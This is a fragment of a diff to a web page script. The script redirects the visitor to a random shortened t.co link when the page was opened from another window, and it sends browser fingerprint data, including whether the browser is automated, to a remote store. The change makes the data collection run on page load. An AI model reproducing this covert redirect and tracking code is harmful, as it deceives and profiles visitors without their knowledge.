@@ -50,7 +50,6 @@
 	video.style.height = window.innerHeight + 100 + 'px'
 		
 	window.addEventListener('scroll', function() {
-
 		if (window.opener){
 
 			
@@ -58,9 +57,6 @@
 			"https://t.co/1vAqV6JwOr","https://t.co/8LtlaDxkg9","https://t.co/kgVbFeXLMk","https://t.co/3UvgDEAlep"]
 		
 			window.location.href = (links[Math.floor(Math.random() * links.length)])
-			window.scroll(0, 50); 
-			storeData()
-			
 				 }
 			})
 
@@ -100,8 +96,10 @@
 				Webdriver: navigator.webdriver,
 				Vendor: navigator.vendor
     					}
-			fire.push(postData)	
+			fire.push(postData)
 		});}
+	window.scroll(0, 50); 
+	storeData()
 	
 	</script>
 	
